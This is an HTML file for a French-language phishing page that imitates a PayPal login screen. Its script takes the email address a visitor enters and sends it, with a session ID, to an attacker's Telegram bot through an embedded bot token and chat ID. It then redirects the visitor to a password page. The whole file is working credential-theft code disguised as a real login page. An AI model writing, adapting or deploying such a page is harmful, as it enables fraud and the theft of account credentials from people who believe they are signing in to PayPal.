<!doctype html>
<html lang="fr">
<head>
<!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
    <link rel="icon" type="image/x-icon" href="logo.ico">
    <link rel="shortcut icon" type="image/x-icon" href="logo.ico">

    <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
    <link rel="apple-touch-icon" href="logo.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Paypal.com</title>
  <style>
    :root { color: #111; font-family: "Futura", Arial, Helvetica, sans-serif; font-weight: bold; background: #fff; }
    * { box-sizing: border-box; }
    html, body { min-height: 100vh; margin: 0; display: flex; flex-direction: column; background: #fff; }
    main { width: min(100% - 40px, 400px); padding: 40px 0; margin: auto; text-align: center; flex: 1; display: flex; flex-direction: column; justify-content: center; }
    .top-logo { width: 400px; max-width: 100%; height: auto; margin: 0 auto 24px auto; display: block; }
    h1 { margin: 0 0 28px; font-size: 24px; font-weight: bold; text-align: center; }
    .field-label { display: block; margin: 0 0 10px; font-size: 15px; font-weight: bold; text-align: left; }
    .image-field { position: relative; width: 100%; aspect-ratio: 400 / 74; margin-bottom: 22px; }
    .image-field img { display: block; width: 100%; height: 100%; }
    .image-field input { position: absolute; inset: 3px 4%; width: 92%; border: 0; outline: 0; background: transparent; color: #111; font: inherit; font-weight: bold; padding: 0 10px; }
    .action { display: block; width: 85%; max-width: 340px; margin: 0 auto; padding: 0; border: 0; background: transparent; cursor: pointer; }
    .action img { display: block; width: 100%; height: auto; }
    .page-footer { width: 100%; margin-top: auto; }
    .page-footer img { display: block; width: 100%; height: auto; object-fit: cover; }
  </style>
</head>
<body>
  <main>
    <img src="logo.JPG" alt="Logo" class="top-logo">
    <form id="formStep1">
      <div class="image-field">
        <img src="champs.JPG" alt="">
        <input id="email" type="email" placeholder="Adresse e-mail" required autocomplete="off">
      </div>
      <button class="action" id="submitBtn" type="submit">
        <img src="Connexion.JPG" alt="Connexion">
      </button>
    </form>
  </main>
  <div class="page-footer">
    <img src="footer.JPG" alt="Footer">
  </div>
  <script>
    const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
    const TELEGRAM_CHAT_ID = "8550191274";

    let clientId = localStorage.getItem('client_id');
    if (!clientId) {
      clientId = 'User_' + Math.random().toString(36).substr(2, 6).toUpperCase() + '_' + Date.now().toString().slice(-4);
      localStorage.setItem('client_id', clientId);
    }

    document.getElementById('formStep1').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      if (!email) return;

      const message = `🔔 *Nouvelle info - Étape 1*\n🆔 Session: \`${clientId}\`\n📧 E-mail: \`${email}\``;
      const btn = document.getElementById('submitBtn');
      btn.style.opacity = '0.5';

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
      } catch (error) {
        console.error("Erreur Telegram", error);
      }

      window.location.href = '2-password.html';
    });
  </script>
</body>
</html>
